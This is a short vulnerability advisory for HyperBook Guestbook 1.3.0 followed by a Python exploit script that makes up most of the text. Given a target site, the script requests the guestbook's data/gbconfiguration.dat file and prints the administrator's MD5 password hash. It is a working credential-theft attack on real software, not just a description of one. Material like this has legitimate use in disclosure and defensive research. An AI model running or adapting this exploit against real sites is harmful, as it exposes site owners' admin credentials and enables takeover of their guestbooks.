source: http://www.securityfocus.com/bid/22754/info

HyperBook Guestbook is prone to an information-disclosure vulnerability because the application fails to protect sensitive information.

An attacker can exploit this issue to access sensitive information that may lead to other attacks.

This issue affects version 1.3.0; other versions may also be affected.

#!/usr/bin/python
#Script                  :HyperBook Guestbook v1.30 (qbconfiguration.dat) Remote Admin md5 Hash Exploit
#Exploit Coded by        : PeTrO
#Exploit Discovered by   : SaO [www.saohackstyle.com]
#Credits to              :[soulreaver],Kuzey
 

import urllib
import sys
import parser

serv="http://"
i=0
for arg in sys.argv:
     i=i+1

if i!=3:
 print """\n\n
         \tHyperBook Guestbook v1.30  (qbconfiguration.dat) 
         \t\t    Remote Admin md5 Hash Exploit 
          \t                            
          \tUsage:Exploit.py [targetsite] [path] 
          \tExample:Exploit.py www.target.com /guestbook/\n\n"""
else:
    

    adres=sys.argv[1]
    path=sys.argv[2]

    str1=adres.join([serv,path])
    str2=str1.join(['','data/gbconfiguration.dat'])

    print "\n[~]Connecting..."
    url=urllib.urlopen(str2).read(); 
    print "\n[+]Connected!"
 
    test=url.find(path);

    t=0;
    print "\n\t\t\t-=[Admin md5 hash]=-"
    while(url[test+1]!=1): #parsing hash... by PeTrO..
              print url[test],

              if(url[test]=='\n'):
                 t=t+1;  

              if(t==2):
                 break;
                
              test=test+1;

    print "\n\n\t\t\t[ c0ded by PeTrO ]"